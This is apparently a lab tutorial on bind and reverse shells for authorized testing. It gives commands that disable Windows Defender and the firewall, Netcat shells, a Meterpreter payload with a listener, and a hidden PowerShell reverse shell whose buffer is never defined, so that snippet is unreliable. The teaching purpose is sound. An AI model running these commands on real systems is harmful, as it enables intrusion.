# In this section we will learn how modern security professionals often encounter environments where installing new tools is not possible. In these cases, attackers (and penetration testers) may rely on **small-footprint, built-in, or commonly available tools** to gain access.

> ⚠️ **Ethical & Legal Notice**
> This guide is provided **strictly for defensive security education and authorized testing**. Only perform these actions on systems you own or have explicit written permission to test. The goal is to understand how shells work so they can be detected and prevented.

---

This project demonstrates:

* What a shell is and how it works
* The difference between **bind shells** and **reverse shells**
* How **Netcat**, **PowerShell**, and **Metasploit** are commonly used
* Why outbound-only shells are more effective in real environments

---

## Key Concepts

### What Is a Shell?

A **shell** provides an interface to a remote system that allows command execution.

* **Linux shells:** `bash`, `sh`
* **Windows shells:** `cmd`, `PowerShell`

### Types of Shells

#### Bind Shell

* The target system opens a port and listens
* The attacker connects inbound
* Often blocked by firewalls

#### Reverse Shell

* The attacker opens a listener
* The target connects outbound
* Commonly bypasses firewall restrictions

---

## Environment Details

* **Linux Desktop IP:** `<your IP>`
* **Windows Target IP:** `<your IP>`
* **Shell tools directory:** `/home/ubuntu/lab`
* **Primary tool:** `nc` / `nc.exe`

---

## Step 1: Prepare the Windows Target

To keep the focus on shell mechanics (not defense evasion), security protections are disabled.

1. Open **PowerShell as Administrator**
2. Run:

   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -MAPSReporting 0
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
   ```

---

## Step 2: Transfer Netcat to Windows (Living-Off-The-Land)

### Start a Web Server on Linux

Open a terminal on the Linux Desktop.

Become root and move to home:

```bash
sudo su
cd /home/ubuntu
```

Start a simple web server:

```bash
python3 -m http.server
```

### Download Netcat on Windows

Open **Command Prompt as Administrator**.

Create a temporary directory:

```cmd
mkdir C:\temp
```

Download Netcat:

```powershell
powershell (new-object System.Net.WebClient).DownloadFile(
  'http://<your IP>:8000/lab/nc.exe',
  'C:\temp\nc.exe'
)
```
<img width="853" height="206" alt="Screenshot 2026-02-24 at 10 35 55 AM" src="https://github.com/user-attachments/assets/aa0a3801-83d2-448d-9f1b-e19121d34f67" />

---

## Step 3: Create a Bind Shell (Demonstration)

On Windows:

```cmd
C:\temp\nc.exe -nlvp 1337 -e cmd.exe
```

On Linux, stop the web server (`Ctrl + C`).

Connect to the shell:

```bash
nc -nv <your IP> 1337
```

**Result:**<img width="555" height="131" alt="Screenshot 2026-02-24 at 10 36 10 AM" src="https://github.com/user-attachments/assets/e63f7c55-9909-4b1f-bb14-535a7fb203e1" />

You receive a `C:\temp>` prompt on Linux.

**Limitation:** Bind shells depend on inbound firewall rules and are rarely reliable in production environments.

---

## Step 4: Create a Reverse Shell (Preferred Method)

### Start Listener on Linux

```bash
nc -nlvp 1337
```

### Send Reverse Shell from Windows

```cmd
C:\temp\nc.exe -nv <your IP> 1337 -e cmd.exe
```

**Result:**
The Windows system connects outbound and delivers a shell to Linux.

---

## Step 5: Amplifying Shells with Metasploit

### Generate a Meterpreter Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<your IP> LPORT=8443 \
  -f vbs -o shell.vbs
```

---

## Step 6: Host the Payload

Create a screen session:

```bash
screen -S webserver
```

Start the web server:

```bash
python3 -m http.server
```

Detach with `Ctrl + A`, then `D`.

---

## Step 7: Start Metasploit Listener

```bash
sudo msfconsole -q -x "
use multi/handler;
set payload windows/x64/meterpreter/reverse_tcp;
set LHOST <your IP>;
set LPORT 8443;
exploit"
```
<img width="857" height="260" alt="Screenshot 2026-02-24 at 10 36 25 AM" src="https://github.com/user-attachments/assets/7db48f05-2c21-4032-9e26-ba634d195569" />

---

## Step 8: Execute Payload on Windows

Open a browser.

Navigate to:

```
http://<your IP>:8000
```

Download and run `shell.vbs`.

Allow execution if prompted.

---

## Step 9: Interact with Meterpreter

Once connected:

```text
meterpreter >
```

Useful commands:

```text
help
sysinfo
shell
```

---

## Step 10: PowerShell-Based Reverse Shell

### Linux Listener

```bash
nc -lvnp 8448
```

### Windows PowerShell Reverse Shell

```powershell
powershell -nop -w hidden -ep bypass -c "
$client = New-Object Net.Sockets.TCPClient('<your IP>',8448);
$stream = $client.GetStream();
$writer = New-Object IO.StreamWriter($stream);
function prompt($s){$writer.Write($s+'PS> ');$writer.Flush()}
prompt '';
while(($i=$stream.Read($b,0,$b.Length)) -gt 0){
  $cmd = ([text.encoding]::UTF8).GetString($b,0,$i-1);
  $out = try {iex $cmd 2>&1 | Out-String} catch {$_};
  prompt $out
}"
```

---

## Key Defensive Takeaways

* Reverse shells exploit outbound-allowed traffic
* Netcat and PowerShell are frequently abused due to availability
* Monitoring outbound connections is critical
* PowerShell logging and application control are essential
* Small tools can have large impact

---

## Conclusion

This project demonstrated how shells are created, amplified, and stabilized using commonly available tools. Understanding these techniques enables defenders to:

* Detect abnormal outbound connections
* Harden endpoint security
* Improve incident response effectiveness

Knowledge of offensive techniques is a cornerstone of strong defensive security.
